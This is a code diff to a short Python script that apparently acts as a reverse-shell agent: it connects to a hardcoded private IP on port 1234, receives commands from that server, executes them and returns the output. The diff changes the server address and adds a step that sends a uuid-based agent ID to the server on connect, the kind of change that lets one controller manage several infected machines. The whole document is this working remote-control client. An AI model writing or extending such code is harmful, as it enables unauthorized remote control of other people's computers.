@@ -1,6 +1,11 @@
 import socket
 import subprocess
 import os
+import uuid
+
+def get_agent_id():
+    # Generate a unique agent ID based on machine and network information
+    return str(uuid.uuid1())
 
 
 def execute_command(command):
@@ -24,7 +29,11 @@ def execute_command(command):
 
 def main():
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect(('192.168.80.79', 1234))  # Enter the server's IP address here
+    client.connect(('192.168.72.177', 1234))  # Enter the server's IP address here
+
+    # Send Agent ID to the server
+    agent_id = get_agent_id()
+    client.send(agent_id.encode('utf-8'))
 
     while True:
         command = client.recv(4096).decode('utf-8')
@@ -38,6 +47,7 @@ def main():
             client.send(output.encode('utf-8'))
 
     client.close()
+
 
 if __name__ == "__main__":
     main()
